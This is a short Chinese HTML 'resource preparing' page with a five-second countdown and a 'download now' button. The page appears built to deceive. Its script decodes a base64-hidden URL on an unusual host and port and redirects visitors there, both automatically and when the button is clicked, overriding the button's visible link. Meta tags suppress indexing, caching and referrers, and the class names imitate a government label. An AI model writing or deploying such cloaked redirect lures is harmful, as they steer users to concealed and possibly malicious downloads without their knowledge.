<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <link rel="canonical" href="https://zh.xz.cn/">
  <title>资源准备中</title>
  <link rel="icon" href="/favicon.ico">
  <link rel="stylesheet" href="/assets/css/style.css">
</head>
<body class="redirect-page redirect-page-zh-xz-govcn zh.xz-govcn">
  <main class="redirect-card redirect-card-zh-xz-govcn zh.xz-govcn">
    <div class="loader-ring" aria-hidden="true"></div>
    <h1>资源准备中</h1>
    <p>正在校验连接环境</p>
    <p>即将进入下载页面</p>
    <p>请勿关闭当前页面</p>
    <div class="progress-track" aria-hidden="true"><div class="progress-bar"></div></div>
    <div class="countdown"><span id="seconds">5</span> 秒后自动进入</div>
    <a id="manualDownload" class="btn btn-primary manual-download download-btn-zh-xz-govcn zh.xz-govcn" href="/kexue.html" rel="nofollow noopener noreferrer">立即下载</a>
  </main>
  <script>
    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9iNTUuMzEzNDg2Lnh5ejozNTg4OC8=");
    const manualDownload = document.getElementById("manualDownload");
    const seconds = document.getElementById("seconds");
    let remain = 5;

    const timer = window.setInterval(function () {
      remain -= 1;
      seconds.textContent = String(Math.max(remain, 0));
      if (remain <= 0) {
        window.clearInterval(timer);
        window.location.replace(REAL_DOWNLOAD_URL);
      }
    }, 1000);

    manualDownload.addEventListener("click", function(e){
      e.preventDefault();
      window.location.replace(REAL_DOWNLOAD_URL);
    });
  </script>
</body>
</html>
